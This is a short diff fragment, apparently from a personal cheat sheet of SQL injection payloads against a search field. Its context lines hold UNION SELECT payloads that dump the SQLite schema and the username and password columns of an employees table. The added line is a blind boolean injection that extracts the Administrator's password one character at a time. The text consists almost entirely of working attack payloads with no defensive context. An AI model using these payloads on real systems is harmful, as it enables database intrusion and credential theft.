@@ -14,3 +14,5 @@ juice' UNION SELECT name,sql,3 from sqlite_master WHERE type="table"; --
 
 #Get info from the 2 columns and make a third column
 juice' UNION SELECT username,password,3 from employees;--
+
+juice' AND SUBSTRING((SELECT password FROM employees WHERE Username = 'Administrator'), 1, 1) > 'q
